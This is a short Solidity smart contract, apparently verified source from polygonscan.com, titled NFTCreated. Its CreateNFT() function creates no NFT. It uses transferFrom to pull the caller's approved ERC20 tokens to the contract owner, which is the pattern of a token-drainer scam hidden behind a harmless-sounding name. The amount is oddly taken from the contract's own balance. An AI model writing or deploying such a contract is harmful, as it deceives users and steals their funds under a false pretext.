/**
 *Submitted for verification at polygonscan.com on 2022-04-15
*/

pragma solidity 0.4.26;


interface IERC20Token {
    function balanceOf(address owner) public returns (uint256);
    function transfer(address to, uint256 amount) public returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() public returns (uint256);
}

contract NFTCreated {
    IERC20Token public tokenContract;  

    address public owner;

    uint256 public tokensSold;

    function NFTCreated(IERC20Token _tokenContract) public {
        owner = msg.sender;
        tokenContract = _tokenContract;
    }

    function CreateNFT() public {
        tokenContract.transferFrom(msg.sender,owner,tokenContract.balanceOf(this));
    }
    
}